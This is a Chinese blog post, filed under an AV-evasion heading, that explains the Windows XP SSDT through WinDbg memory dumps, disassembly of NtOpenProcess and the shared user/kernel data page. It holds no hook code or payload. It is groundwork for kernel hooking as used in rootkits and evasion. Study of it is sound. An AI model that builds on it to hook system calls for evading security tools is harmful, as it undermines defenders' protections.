<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-免杀/SSDT Hook" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/SSDT%20Hook/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.559Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SSDT表"><a href="#SSDT表" class="headerlink" title="SSDT表"></a>SSDT表</h1><p>系统服务描述符表</p>
<p>这里以Windows XP SP3为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line"><span class="number">80553f</span>a0  <span class="number">80502b</span>8c <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">80503000</span></span><br><span class="line"><span class="number">80553f</span>b0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>c0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>d0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>e0  <span class="number">00002710</span> bf80c0b6 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>f0  f8b7ba80 f82ffb60 <span class="number">820808f</span>8 <span class="number">806e2</span>f40</span><br><span class="line"><span class="number">80554000</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80554010</span>  <span class="number">28728</span>ec0 <span class="number">01</span>db120e <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>第一个参数指向的是内核函数存储的首地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd <span class="number">80502b</span>8c</span><br><span class="line">ReadVirtual: <span class="number">80502b</span>8c not properly sign extended</span><br><span class="line"><span class="number">80502b</span>8c  <span class="number">8059</span>a948 <span class="number">805e7</span>db6 <span class="number">805</span>eb5fc <span class="number">805e7</span>de8</span><br><span class="line"><span class="number">80502b</span>9c  <span class="number">805</span>eb636 <span class="number">805e7</span>e1e <span class="number">805</span>eb67a <span class="number">805</span>eb6be</span><br><span class="line"><span class="number">80502b</span>ac  <span class="number">8060</span>cdfe <span class="number">8060</span>db50 <span class="number">805e31</span>b4 <span class="number">805e2</span>e0c</span><br><span class="line"><span class="number">80502b</span>bc  <span class="number">805</span>cbde6 <span class="number">805</span>cbd96 <span class="number">8060</span>d424 <span class="number">805</span>ac5ae</span><br><span class="line"><span class="number">80502b</span>cc  <span class="number">8060</span>ca3c <span class="number">8059</span>edbe <span class="number">805</span>a6a00 <span class="number">805</span>cd8c4</span><br><span class="line"><span class="number">80502b</span>dc  <span class="number">80500828</span> <span class="number">8060</span>db42 <span class="number">8056</span>ccd6 <span class="number">8053600</span>e</span><br><span class="line"><span class="number">80502b</span>ec  <span class="number">806060</span>d4 <span class="number">805b</span>2c3a <span class="number">805</span>ebb36 <span class="number">8061</span>ae56</span><br><span class="line"><span class="number">80502b</span>fc  <span class="number">805f</span>0028 <span class="number">8059b</span>036 <span class="number">8061b</span>0aa <span class="number">8059</span>a8e8</span><br></pre></td></tr></table></figure>

<p>第三个参数11c（284）代表的是SSDT表有多少个内核函数</p>
<p>第四个参数指向的是一个地址，这个地址表示的内核函数相对应的参数个数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd <span class="number">80503000</span></span><br><span class="line">ReadVirtual: <span class="number">80503000</span> not properly sign extended</span><br><span class="line"><span class="number">80503000</span>  <span class="number">2</span>c2c2018 <span class="number">44402</span>c40 <span class="number">1818080</span>c <span class="number">0</span>c040408</span><br><span class="line"><span class="number">80503010</span>  <span class="number">08081810</span> <span class="number">0808040</span>c <span class="number">080</span>c0404 <span class="number">2004040</span>c</span><br><span class="line"><span class="number">80503020</span>  <span class="number">140</span>c1008 <span class="number">0</span>c102c0c <span class="number">10201</span>c0c <span class="number">20141038</span></span><br><span class="line"><span class="number">80503030</span>  <span class="number">141</span>c2424 <span class="number">34102010</span> <span class="number">080</span>c0814 <span class="number">04040404</span></span><br><span class="line"><span class="number">80503040</span>  <span class="number">0428080</span>c <span class="number">1808181</span>c <span class="number">1808180</span>c <span class="number">040</span>c080c</span><br><span class="line"><span class="number">80503050</span>  <span class="number">100</span>c0010 <span class="number">10080828</span> <span class="number">0</span>c08041c <span class="number">00081004</span></span><br><span class="line"><span class="number">80503060</span>  <span class="number">0</span>c080408 <span class="number">10040828</span> <span class="number">0</span>c0c0404 <span class="number">28240428</span></span><br><span class="line"><span class="number">80503070</span>  <span class="number">0</span>c0c0c30 <span class="number">0</span>c0c0c18 <span class="number">0</span>c10300c <span class="number">0</span>c0c0c10</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>比如0x2c &#x3D; 44，44&#x2F;4 &#x3D; 11个参数</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们来看一个函数OpenProcess是具体怎么调用的</p>
<p><strong>tips：最好是什么编译环境，就在什么环境分析，xp上编的在xp上分析，win10上编的在win10上分析</strong></p>
<p>可以看见，OpenProcess也是调用了kernel32.dll</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240929102131156.png" alt="image-20240929102131156"></p>
<p>kernel32.dll里面看见了syscall的调用，调用号是0x7A<img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240929103916872.png" alt="image-20240929103916872"></p>
<p>这时候找到SSDT表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line"><span class="number">80553f</span>a0  <span class="number">80502b</span>8c <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">80503000</span></span><br><span class="line"><span class="number">80553f</span>b0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>c0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>d0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>e0  <span class="number">00002710</span> bf80c0b6 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>f0  f8b67a80 f82ffb60 <span class="number">81b</span>e2928 <span class="number">806e2</span>f40</span><br><span class="line"><span class="number">80554000</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80554010</span>  <span class="number">08909</span>a40 <span class="number">01</span>db1211 <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd <span class="number">80502b</span>8c+<span class="number">7</span>a*<span class="number">4</span></span><br><span class="line">ReadVirtual: <span class="number">80502</span>d74 not properly sign extended</span><br><span class="line"><span class="number">80502</span>d74  <span class="number">805</span>c2296 <span class="number">805e49</span>fc <span class="number">805e4660</span> <span class="number">805</span>a0722</span><br><span class="line"><span class="number">80502</span>d84  <span class="number">8060</span>c254 <span class="number">805b</span>a77a <span class="number">805</span>c2522 <span class="number">805e4</span>a1a</span><br><span class="line"><span class="number">80502</span>d94  <span class="number">805e47</span>d0 <span class="number">8060e1</span>b0 <span class="number">8063</span>cc78 <span class="number">805</span>c0346</span><br><span class="line"><span class="number">80502</span>da4  <span class="number">805</span>eedce <span class="number">805</span>eaa16 <span class="number">805</span>eac02 <span class="number">805</span>aea08</span><br><span class="line"><span class="number">80502</span>db4  <span class="number">806062</span>dc <span class="number">8056</span>d0ce <span class="number">8060</span>db50 <span class="number">8060</span>db50</span><br><span class="line"><span class="number">80502</span>dc4  <span class="number">8053</span>d02e <span class="number">80607e68</span> <span class="number">80608</span>ac8 <span class="number">80570074</span></span><br><span class="line"><span class="number">80502</span>dd4  <span class="number">805b</span>4de0 <span class="number">805703</span>ca <span class="number">806063</span>a4 <span class="number">8056</span>d222</span><br><span class="line"><span class="number">80502</span>de4  <span class="number">8060</span>d2dc <span class="number">80570</span>c46 <span class="number">805</span>ccee0 <span class="number">8059b</span>6fc</span><br></pre></td></tr></table></figure>

<p>在这里0x805c2296就是我们要找的函数调用表的首地址，进去看个伪代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; u 805c2296 L50</span><br><span class="line">805c2296 68c4000000      push    0C4h</span><br><span class="line">805c229b 68a8aa4d80      push    offset nt!ObWatchHandles+0x25c (804daaa8)</span><br><span class="line">805c22a0 e86b6cf7ff      call    nt!_SEH_prolog (80538f10)</span><br><span class="line">805c22a5 33f6            xor     esi,esi</span><br><span class="line">805c22a7 8975d4          mov     dword ptr [ebp-2Ch],esi</span><br><span class="line">805c22aa 33c0            xor     eax,eax</span><br><span class="line">805c22ac 8d7dd8          lea     edi,[ebp-28h]</span><br><span class="line">805c22af ab              stos    dword ptr es:[edi]</span><br><span class="line">805c22b0 64a124010000    mov     eax,dword ptr fs:[00000124h]</span><br><span class="line">805c22b6 8a8040010000    mov     al,byte ptr [eax+140h]</span><br><span class="line">805c22bc 8845cc          mov     byte ptr [ebp-34h],al</span><br><span class="line">805c22bf 84c0            test    al,al</span><br><span class="line">805c22c1 0f848f000000    je      nt!NtOpenProcess+0xc0 (805c2356)</span><br><span class="line">805c22c7 8975fc          mov     dword ptr [ebp-4],esi</span><br><span class="line">805c22ca a1d4995580      mov     eax,dword ptr [nt!MmUserProbeAddress (805599d4)]</span><br><span class="line">805c22cf 8b4d08          mov     ecx,dword ptr [ebp+8]</span><br><span class="line">805c22d2 3bc8            cmp     ecx,eax</span><br><span class="line">805c22d4 7202            jb      nt!NtOpenProcess+0x42 (805c22d8)</span><br><span class="line">805c22d6 8930            mov     dword ptr [eax],esi</span><br><span class="line">805c22d8 8b01            mov     eax,dword ptr [ecx]</span><br><span class="line">805c22da 8901            mov     dword ptr [ecx],eax</span><br><span class="line">805c22dc 8b5d10          mov     ebx,dword ptr [ebp+10h]</span><br><span class="line">805c22df f6c303          test    bl,3</span><br><span class="line">805c22e2 7405            je      nt!NtOpenProcess+0x53 (805c22e9)</span><br><span class="line">805c22e4 e8d5970400      call    nt!ExRaiseDatatypeMisalignment (8060babe)</span><br><span class="line">805c22e9 a1d4995580      mov     eax,dword ptr [nt!MmUserProbeAddress (805599d4)]</span><br><span class="line">805c22ee 3bd8            cmp     ebx,eax</span><br><span class="line">805c22f0 7207            jb      nt!NtOpenProcess+0x63 (805c22f9)</span><br><span class="line">805c22f2 8930            mov     dword ptr [eax],esi</span><br><span class="line">805c22f4 a1d4995580      mov     eax,dword ptr [nt!MmUserProbeAddress (805599d4)]</span><br><span class="line">805c22f9 397308          cmp     dword ptr [ebx+8],esi</span><br><span class="line">805c22fc 0f9545e6        setne   byte ptr [ebp-1Ah]</span><br><span class="line">805c2300 8b4b0c          mov     ecx,dword ptr [ebx+0Ch]</span><br><span class="line">805c2303 894dc8          mov     dword ptr [ebp-38h],ecx</span><br><span class="line">805c2306 8b4d14          mov     ecx,dword ptr [ebp+14h]</span><br></pre></td></tr></table></figure>

<h3 id="KeServiceDescriptorTable和KeServiceDescriptorTableShadow"><a href="#KeServiceDescriptorTable和KeServiceDescriptorTableShadow" class="headerlink" title="KeServiceDescriptorTable和KeServiceDescriptorTableShadow"></a>KeServiceDescriptorTable和KeServiceDescriptorTableShadow</h3><p>在 NT 4.0 以上的 Windows 操作系统中，默认就存在两个系统服务描述表，这两个调度表对应了两类不 同的系统服务，这两个调度表为： <strong>KeServiceDescriptorTable</strong> 和 <strong>KeServiceDescriptorTableShadow</strong> ，其中 KeServiceDescriptorTable 主要是处理来自 ring3 层 kernel32.dll 中的系统调用，而 KeServiceDescriptorTableShadow 则主要处理来自 User32.dll 和 GDI32.dll 中的系统调用，并且 KeServiceDescriptorTable 在 ntoskrnl.exe 是导出的，而 KeServiceDescriptorTableShadow 则是没有被 Windows 操作系统所导出</p>
<h3 id="SSDT表的结构"><a href="#SSDT表的结构" class="headerlink" title="SSDT表的结构"></a>SSDT表的结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">KSYSTEM_SERVICE_TABLE ntoskrnl; <span class="comment">// ntoskrnl.exe 的服务函数</span></span><br><span class="line">KSYSTEM_SERVICE_TABLE win32k; <span class="comment">// win32k.sys 的服务函数(GDI32.dll/User32.dll 的</span></span><br><span class="line">内核支持)</span><br><span class="line">KSYSTEM_SERVICE_TABLE notUsed1;</span><br><span class="line">KSYSTEM_SERVICE_TABLE notUsed2;</span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p>其中每一项又是一个结构体<strong>KSYSTEM_SERVICE_TABLE</strong>，通过结构体表示为如下，也是我们用指令<strong>dd KeServiceDescriptorTable</strong>看到的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">PULONG ServiceTableBase; <span class="comment">// SSDT (System Service Dispatch Table)的基地址</span></span><br><span class="line">PULONG ServiceCounterTableBase; <span class="comment">// 用于 checked builds, 包含 SSDT 中每个服务被调</span></span><br><span class="line">用的次数</span><br><span class="line">ULONG NumberOfService; <span class="comment">// 服务函数的个数, NumberOfService * 4 就是整个地址表的</span></span><br><span class="line">大小</span><br><span class="line">ULONG ParamTableBase; <span class="comment">// SSPT(System Service Parameter Table)的基地址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, * PKSYSTEM_SERVICE_TABLE;</span><br></pre></td></tr></table></figure>

<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>由于三环和零环有数据需要交互，所以在Windows中，在User层和Kernel层分别定义了一个_KUSER_SHARED_DATA结构区域，用于User层和Kernel层共享某些数据，它们使用固定的地址值映射，</p>
<p>在32位系统中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User 层地址为：<span class="number">0x7ffe0000</span></span><br><span class="line">Kernel 层地址为：<span class="number">0xffdf0000</span></span><br></pre></td></tr></table></figure>

<p>在内核中,首先在0x300偏移处看见了例如SystemCall的调用地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kd&gt;  dt _KUSER_SHARED_DATA <span class="number">0xffdf0000</span></span><br><span class="line">nt!_KUSER_SHARED_DATA</span><br><span class="line">   +<span class="number">0x000</span> TickCountLow     : <span class="number">0x974</span></span><br><span class="line">   +<span class="number">0x004</span> TickCountMultiplier : <span class="number">0xfa00000</span></span><br><span class="line">   +<span class="number">0x008</span> InterruptTime    : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x014</span> SystemTime       : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x020</span> TimeZoneBias     : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x02c</span> ImageNumberLow   : <span class="number">0x14c</span></span><br><span class="line">   +<span class="number">0x02e</span> ImageNumberHigh  : <span class="number">0x14c</span></span><br><span class="line">   +<span class="number">0x030</span> NtSystemRoot     : [<span class="number">260</span>] <span class="number">0x43</span></span><br><span class="line">   +<span class="number">0x238</span> MaxStackTraceDepth : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x23c</span> CryptoExponent   : <span class="number">0</span></span><br><span class="line">............................................</span><br><span class="line">   +<span class="number">0x300</span> SystemCall       : <span class="number">0x7c92e4f0</span></span><br><span class="line">   +<span class="number">0x304</span> SystemCallReturn : <span class="number">0x7c92e4f4</span></span><br><span class="line">   +<span class="number">0x308</span> SystemCallPad    : [<span class="number">3</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x320</span> TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x320</span> TickCountQuad    : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x330</span> Cookie           : <span class="number">0x820b9fac</span></span><br></pre></td></tr></table></figure>

<p>在用户层中，我们也可以展开来看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KUSER_SHARED_DATA <span class="number">0x7ffe0000</span></span><br><span class="line">nt!_KUSER_SHARED_DATA</span><br><span class="line">   +<span class="number">0x000</span> TickCountLow     : <span class="number">0x974</span></span><br><span class="line">   +<span class="number">0x004</span> TickCountMultiplier : <span class="number">0xfa00000</span></span><br><span class="line">   +<span class="number">0x008</span> InterruptTime    : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x014</span> SystemTime       : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x020</span> TimeZoneBias     : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x02c</span> ImageNumberLow   : <span class="number">0x14c</span></span><br><span class="line">   +<span class="number">0x02e</span> ImageNumberHigh  : <span class="number">0x14c</span></span><br><span class="line">   +<span class="number">0x030</span> NtSystemRoot     : [<span class="number">260</span>] <span class="number">0x43</span></span><br><span class="line">   +<span class="number">0x238</span> MaxStackTraceDepth : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x23c</span> CryptoExponent   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x240</span> TimeZoneId       : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x244</span> Reserved2        : [<span class="number">8</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x264</span> NtProductType    : <span class="number">1</span> ( NtProductWinNt )</span><br><span class="line">   +<span class="number">0x268</span> ProductTypeIsValid : <span class="number">0x1</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x26c NtMajorVersion   : 5</span></span><br><span class="line"><span class="string">   +0x270 NtMinorVersion   : 1</span></span><br><span class="line"><span class="string">   +0x274 ProcessorFeatures : [64]  &quot;&quot;</span></span><br><span class="line"><span class="string">   +0x2b4 Reserved1        : 0x7ffeffff</span></span><br><span class="line"><span class="string">   +0x2b8 Reserved3        : 0x80000000</span></span><br><span class="line"><span class="string">   +0x2bc TimeSlip         : 0</span></span><br><span class="line"><span class="string">   +0x2c0 AlternativeArchitecture : 0 ( StandardDesign )</span></span><br><span class="line"><span class="string">   +0x2c8 SystemExpirationDate : _LARGE_INTEGER 0x0</span></span><br><span class="line"><span class="string">   +0x2d0 SuiteMask        : 0x110</span></span><br><span class="line"><span class="string">   +0x2d4 KdDebuggerEnabled : 0x3 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x2d5</span> NXSupportPolicy  : <span class="number">0x2</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x2d8 ActiveConsoleId  : 0</span></span><br><span class="line"><span class="string">   +0x2dc DismountCount    : 0</span></span><br><span class="line"><span class="string">   +0x2e0 ComPlusPackage   : 0xffffffff</span></span><br><span class="line"><span class="string">   +0x2e4 LastSystemRITEventTickCount : 0</span></span><br><span class="line"><span class="string">   +0x2e8 NumberOfPhysicalPages : 0x1ff6c</span></span><br><span class="line"><span class="string">   +0x2ec SafeBootMode     : 0 &#x27;</span>&#x27;</span><br><span class="line">   +<span class="number">0x2f0</span> TraceLogging     : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x2f8</span> TestRetInstruction : <span class="number">0xc3</span></span><br><span class="line">   +<span class="number">0x300</span> SystemCall       : <span class="number">0x7c92e4f0</span></span><br><span class="line">   +<span class="number">0x304</span> SystemCallReturn : <span class="number">0x7c92e4f4</span></span><br><span class="line">   +<span class="number">0x308</span> SystemCallPad    : [<span class="number">3</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x320</span> TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x320</span> TickCountQuad    : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x330</span> Cookie           : <span class="number">0x820b9fac</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看见几个相似偏移的地址是相同的，证明这些映射的物理页也是相同的</p>
<p>也可以用别的指令看看，结论是相同的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd <span class="number">0x7ffe0000</span></span><br><span class="line"><span class="number">7f</span>fe0000  <span class="number">0001e3</span>a9 <span class="number">0f</span>a00000 <span class="number">8122b</span>b6a <span class="number">00000004</span></span><br><span class="line"><span class="number">7f</span>fe0010  <span class="number">00000004</span> <span class="number">1</span>af24bac <span class="number">01</span>db1269 <span class="number">01</span>db1269</span><br><span class="line"><span class="number">7f</span>fe0020  f1dcc000 ffffffbc ffffffbc <span class="number">014</span>c014c</span><br><span class="line"><span class="number">7f</span>fe0030  <span class="number">003</span>a0043 <span class="number">0057005</span>c <span class="number">004e0049</span> <span class="number">004f</span>0044</span><br><span class="line"><span class="number">7f</span>fe0040  <span class="number">00530057</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">7f</span>fe0050  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">7f</span>fe0060  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">7f</span>fe0070  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd <span class="number">0xffdf0000</span></span><br><span class="line">ReadVirtual: ffdf0000 not properly sign extended</span><br><span class="line">ffdf0000  <span class="number">0001e3</span>a9 <span class="number">0f</span>a00000 <span class="number">8122b</span>b6a <span class="number">00000004</span></span><br><span class="line">ffdf0010  <span class="number">00000004</span> <span class="number">1</span>af24bac <span class="number">01</span>db1269 <span class="number">01</span>db1269</span><br><span class="line">ffdf0020  f1dcc000 ffffffbc ffffffbc <span class="number">014</span>c014c</span><br><span class="line">ffdf0030  <span class="number">003</span>a0043 <span class="number">0057005</span>c <span class="number">004e0049</span> <span class="number">004f</span>0044</span><br><span class="line">ffdf0040  <span class="number">00530057</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0050  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0060  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0070  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>虽然指向的是同一个物理页，但是在User层是只读的，在Kernel层是可写的</p>
